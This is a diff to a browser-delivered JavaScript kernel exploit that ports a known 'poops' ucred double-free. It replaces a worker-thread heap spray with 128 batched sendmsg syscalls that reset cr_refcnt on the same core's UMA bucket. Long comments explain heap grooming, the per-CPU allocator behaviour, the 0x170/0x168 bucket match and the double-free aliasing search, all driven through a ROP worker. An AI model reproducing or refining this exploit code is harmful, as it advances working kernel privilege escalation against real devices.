@@ -168,7 +168,13 @@ const TRIPLET_ATTEMPTS = 5000;
 /* 10000, matching Poops.java's leakKqueue() (`while (attempts < 10000)`).
  * This was 0x200 = 512 - twenty times short of the reference. */
 const KQUEUE_ATTEMPTS  = 10000;
-const REFCNT_ROUNDS    = 32;
+/* cr_refcnt reset: how many sendmsg allocate-write-free cycles to run between
+ * CLEAR_QUEUE and the double-free close. 0x80 is upstream's value (poops does
+ * exactly this loop). Was previously 32 rounds of iov WORKER sprays, which
+ * could not write cr_refcnt at all because those threads are unpinned and so
+ * allocate from a different core's UMA bucket than the one the ucred was freed
+ * into — see ucred_triple_free for the full reasoning. */
+const REFCNT_SENDMSG_N = 0x80;
 // poops.c spins these unbounded (`while (1)`). Bounded here so a lost race
 // reports instead of hanging the browser tab forever.
 /* Upstream runs BOTH of these as `while (true)` - unbounded. We keep a bound
@@ -1380,6 +1386,19 @@ function init() {
     ST.leak_len_ptr = mem.alloc(8);
 
     ST.msg_hdr = mem.alloc(MSG_HDR_SIZE);
+    /* Zero the whole msghdr, not just the two fields we set below.
+     *
+     * mem.alloc does not zero (see the note under msg_iov), so msg_name and
+     * msg_namelen carried stack garbage. That was harmless while this header
+     * was only ever handed to recvmsg on the worker threads, but the cr_refcnt
+     * reset now uses sendmsg, and sendit() dereferences msg_name whenever it is
+     * non-NULL: a garbage pointer with a garbage length means an extra
+     * getsockaddr copyin on every one of the 128 spray calls, and for any
+     * length <= SOCK_MAXADDRLEN a stray malloc alongside it. The iovec spray
+     * would still happen either way, but not cleanly and not identically each
+     * time — and this loop's whole job is to land the same allocation on the
+     * same freed chunk over and over. */
+    mem.bset(ST.msg_hdr, MSG_HDR_SIZE, 0);
     ST.msg_iov = mem.alloc(0x10 * MSG_IOV_NUM);
 
     /* mem.alloc is rop-worker's bump allocator over the Worker stack and does
@@ -1726,22 +1745,42 @@ function ucred_triple_free() {
     sys.netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8);
     log("CLEAR_QUEUE done");
 
-    for (let i = 0; i < REFCNT_ROUNDS; i++) {
-        threads.signal("iov");
-        /* First round only: did the spawn chain actually create threads?
-         * The pinning chain added cpuset_setaffinity + rtprio_thread before
-         * the blocking syscall, so if either faults - or thr_new rejects the
-         * longer chain - the iov spray silently stops existing, cr_refcnt is
-         * never corrected, and find_twins cannot form a pair. That would look
-         * exactly like the 5000-round twins exhaustion we just saw, with no
-         * fault anywhere near find_twins itself. spawn=0 or live=0 here
-         * convicts the pinning change; spawn=4 live=4 clears it. */
-        if (i === 0)
-            beacon("refcnt spawn=" + threads.lastSpawn.iov
-                   + " live=" + threads.liveCount("iov"));
-        sys.sched_yield();
-        threads.drain("iov");
-    }
+    /* Set cr_refcnt back to 1 — with plain sendmsg on THIS thread, as upstream
+     * does, not with the iov worker threads.
+     *
+     * This is the fix for the `self=all` twins exhaustion: rounds=512
+     * nz=76800 tag=76800 self=76800, i.e. 150 sockets x 512 rounds where every
+     * socket read back its OWN rthdr and no two ever aliased. That is not a
+     * slow race, it is a stuck state — the ucred was never on the free list
+     * twice, so no pair can exist however long find_twins grinds.
+     *
+     * Why the worker version could not work: the ucred is freed by the thread
+     * running these syscalls, which init() pinned to MAIN_CORE, so the chunk
+     * goes to THAT core's UMA per-CPU bucket. The iov workers are spawned with
+     * rop.pin false (deliberately — pinning them wrecks the later race timing,
+     * FAILS #5), so each one allocates its iovec from whatever core it happens
+     * to land on. A chunk in core 5's bucket is invisible to every other core,
+     * so cr_refcnt was simply never written, the dup/close that follows found
+     * refcnt > 1, nothing was freed, and there was no double free to find.
+     *
+     * sendmsg fixes all of it at once and is exactly what poops does here
+     * (0x80 iterations, fd 0, msg_iov[0] = {iov_base=1, iov_len=1}):
+     *   - it runs on this thread, so the allocation is drawn from the SAME
+     *     per-CPU bucket the ucred was freed into;
+     *   - sys_sendmsg copyin's the iovec array BEFORE it ever looks at the fd
+     *     and frees it on the way out, so each call is an allocate-write-free
+     *     that can land on the target repeatedly — fd 0 not being a socket is
+     *     irrelevant, and the EFAULT from iov_base=1 is expected;
+     *   - 0x17 iovecs = 0x170 bytes, the same malloc bucket as the 0x168 ucred,
+     *     with iov_base landing exactly on cr_refcnt.
+     * Batched into one chain so all 128 run back-to-back on the pinned thread
+     * with no chance to migrate between them. */
+    const refcntBatch = [];
+    for (let i = 0; i < REFCNT_SENDMSG_N; i++)
+        refcntBatch.push([Number(SYSCALL_NUMS.sendmsg), 0n,
+                          BigInt(ST.msg_hdr), 0n]);
+    window.rop_worker.syscallBatch(refcntBatch);
+    beacon("refcnt sendmsg x" + REFCNT_SENDMSG_N + " (same-core, batched)");
 
     /* The kernel goes DIRTY the instant the double-free happens (inside
      * doubleFreeAndFindTwins below). Set the flag FIRST (synchronous, no yield)
